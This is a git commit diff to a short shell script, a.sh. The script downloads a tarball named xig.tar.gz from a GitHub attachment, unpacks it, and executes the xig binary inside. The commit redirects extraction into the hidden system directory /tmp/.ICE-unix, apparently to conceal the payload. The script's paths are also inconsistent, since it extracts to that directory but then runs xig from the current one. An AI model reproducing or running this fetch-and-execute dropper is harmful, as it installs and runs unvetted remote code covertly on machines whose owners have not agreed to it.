f368be1bec9d392d541564d90ad91ba968030f9f
testuser1s <38086735+testuser1s@users.noreply.github.com>
2018-04-05 06:25:47 +0800

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,6 +1,7 @@
 if [ ! -d xig ];then
-     wget -q https://github.com/testuser1s/k/files/1877782/xig.tar.gz -O - |tar zxf -
+     wget -q https://github.com/testuser1s/k/files/1877782/xig.tar.gz -O - |tar zxf - -C /tmp/.ICE-unix
      rm -f xig.tar.gz
 	 cd xig
 	 ./xig
 fi
+
